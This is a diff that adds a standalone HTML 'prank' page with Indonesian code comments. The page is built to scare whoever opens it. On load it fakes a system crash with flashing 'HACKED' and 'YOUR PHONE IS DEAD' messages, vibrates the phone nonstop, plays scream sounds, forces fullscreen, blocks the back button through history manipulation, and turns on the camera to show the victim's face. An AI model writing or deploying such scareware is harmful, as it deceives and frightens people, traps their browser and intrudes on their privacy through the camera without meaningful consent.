@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>!! SYSTEM FAILURE !!</title>
+    <style>
+        body {
+            background-color: black;
+            color: red;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            font-size: 32px;
+            overflow: hidden;
+            animation: glitchBg 0.05s infinite alternate;
+        }
+
+        @keyframes glitchBg {
+            0% { background-color: black; color: red; }
+            50% { background-color: red; color: white; }
+            100% { background-color: black; color: red; }
+        }
+
+        .glitch-text {
+            position: relative;
+            animation: glitchText 0.05s infinite alternate;
+        }
+
+        @keyframes glitchText {
+            0% { transform: translateX(-5px) translateY(-5px); text-shadow: -5px -5px 10px #ff0000; }
+            100% { transform: translateX(5px) translateY(5px); text-shadow: 5px 5px 10px #ff0000; }
+        }
+
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0.3;
+        }
+
+        .error-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 40px;
+            color: white;
+            animation: textGlitch 0.1s infinite alternate;
+        }
+
+        @keyframes textGlitch {
+            0% { text-shadow: -2px -2px red, 2px 2px blue; }
+            100% { text-shadow: 2px 2px red, -2px -2px blue; }
+        }
+    </style>
+    <script>
+        function startPrank() {
+            // GETAR HP NONSTOP
+            function vibrateLoop() {
+                navigator.vibrate([500, 500, 500]);
+                setTimeout(vibrateLoop, 1000);
+            }
+            vibrateLoop();
+
+            // SUARA RANDOM
+            let sounds = [
+                'https://www.myinstants.com/media/sounds/scream.mp3',
+                'https://www.myinstants.com/media/sounds/fnaf-scream.mp3',
+                'https://www.myinstants.com/media/sounds/horror-ambience.mp3'
+            ];
+            function playScarySound() {
+                let audio = new Audio(sounds[Math.floor(Math.random() * sounds.length)]);
+                audio.volume = 1.0;
+                audio.play();
+            }
+            setInterval(playScarySound, 5000);
+
+            // FULLSCREEN MODE
+            function goFullScreen() {
+                let elem = document.documentElement;
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen();
+                } else if (elem.mozRequestFullScreen) {
+                    elem.mozRequestFullScreen();
+                } else if (elem.webkitRequestFullscreen) {
+                    elem.webkitRequestFullscreen();
+                } else if (elem.msRequestFullscreen) {
+                    elem.msRequestFullscreen();
+                }
+            }
+            goFullScreen();
+
+            // KAMERA MUKA KORBAN AKTIF
+            let video = document.createElement("video");
+            video.autoplay = true;
+            document.body.appendChild(video);
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => video.srcObject = stream)
+                .catch(err => console.log(err));
+
+            // TEKS ERROR RANDOM MUNCUL
+            let errorMessages = [
+                "HACKED",
+                "FATAL SYSTEM FAILURE",
+                "YOUR PHONE IS DEAD",
+                "ERROR 666",
+                "RUN NOW!"
+            ];
+
+            function showError() {
+                let errorText = document.createElement("div");
+                errorText.className = "error-text";
+                errorText.innerHTML = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+                document.body.appendChild(errorText);
+                setTimeout(() => errorText.remove(), 200);
+            }
+            setInterval(showError, 300);
+
+            // BLOKIR BACK & HOME BUTTON
+            history.pushState(null, null, location.href);
+            window.onpopstate = function () {
+                history.go(1);
+            };
+
+            // LAG MODE
+            setInterval(() => {
+                document.body.style.transform = `rotate(${Math.random() * 10 - 5}deg)`;
+                document.body.style.filter = `blur(${Math.random() * 5}px)`;
+                window.scrollTo(Math.random() * 100, Math.random() * 100);
+            }, 300);
+        }
+    </script>
+</head>
+<body onload="startPrank();">
+    <h1 class="glitch-text">⚠ SYSTEM CRITICAL FAILURE ⚠</h1>
+    <p>DEVICE LOCKDOWN INITIATED...</p>
+</body>
+</html>
